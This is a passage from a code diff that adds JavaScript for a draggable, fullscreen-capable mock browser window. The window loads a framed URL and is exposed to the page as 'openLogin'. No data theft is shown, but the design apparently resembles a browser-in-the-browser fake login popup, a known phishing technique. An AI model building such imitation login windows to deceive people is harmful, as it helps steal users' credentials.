+      mwFrame.src = toEmbed(FRAME_URL);
 
-  showBuiltIn.addEventListener('click', (e) => { e.preventDefault(); loadBuiltIn(); });
-  document.getElementById('bookmarkBtn')?.addEventListener('click', e => e.currentTarget.classList.toggle('active'));
-})();
-</script>
+      mockWin.classList.add('active');
+      popOv.classList.add('active');
+      centerMock();
+    }
+
+    function closeMock(){
+      if (document.fullscreenElement === mockWin) document.exitFullscreen().catch(()=>{});
+      mockWin.classList.remove('active', 'dragging');
+      popOv.classList.remove('active');
+      mwFrame.src = 'about:blank';
+    }
+
+    // Fullscreen toggle for the window
+    async function toggleFullscreen(){
+      try{
+        if (document.fullscreenElement === mockWin){
+          await document.exitFullscreen();
+        } else {
+          await mockWin.requestFullscreen();
+        }
+      } catch {}
+    }
+    mwMax.addEventListener('click', toggleFullscreen);
+    document.addEventListener('fullscreenchange', () => {
+      mwMax.title = (document.fullscreenElement === mockWin) ? 'Exit Fullscreen' : 'Fullscreen';
+      mwMax.setAttribute('aria-label', mwMax.title);
+    });
+
+    mwClose.addEventListener('click', closeMock);
+    popOv.addEventListener('click', closeMock);
+
+    // Drag from the TOP ONLY (titlebar or toolbar)
+    (function(){
+      let dragging=false, offX=1, offY=0;
+
+      function canStartDrag(e){
+        if (e.pointerType === 'mouse' && e.button !== 0) return false; // left click only
+        const t = e.target;
+        if (t.closest('input,textarea,button,a,[role="button"]')) return false;
+        return true;
+      }
+
+      function start(e){
+        if (!canStartDrag(e)) return;
+        dragging = true;
+        const r = mockWin.getBoundingClientRect();
+        offX = e.clientX - r.left;
+        offY = e.clientY - r.top;
+        mockWin.classList.add('dragging');
+        e.currentTarget.setPointerCapture?.(e.pointerId);
+        e.preventDefault();
+      }
+
+      function move(e){
+        if (!dragging) return;
+        const w = mockWin.offsetWidth, h = mockWin.offsetHeight;
+        let L = e.clientX - offX;
+        let T = e.clientY - offY;
+        const {L: cL, T: cT} = clampPosition(L, T, w, h);
+        mockWin.style.left = cL + 'px';
+        mockWin.style.top  = cT + 'px';
+      }
+
+      function end(e){
+        if (!dragging) return;
+        dragging = false;
+        mockWin.classList.remove('dragging');
+        e.currentTarget.releasePointerCapture?.(e.pointerId);
+      }
+
+      [mwTitlebar, mwToolbar].forEach(el=>{
+        el.addEventListener('pointerdown', start);
+        el.addEventListener('pointermove', move);
+        el.addEventListener('pointerup', end);
+        el.addEventListener('pointercancel', end);
+        el.addEventListener('lostpointercapture', end);
+      });
+    })();
+
+    // Keep top bar visible on resize
+    window.addEventListener('resize', () => {
+      if (!mockWin.classList.contains('active')) return;
+      const rect = mockWin.getBoundingClientRect();
+      const {L: cL, T: cT} = clampPosition(rect.left, rect.top, rect.width, rect.height);
+      mockWin.style.left = cL + 'px';
+      mockWin.style.top  = cT + 'px';
+    });
+
+    // Expose for the Continue button
+    window.openLogin = openMock;
+    window.closeIframe = closeMock;
+  </script>
 </body>
 </html>
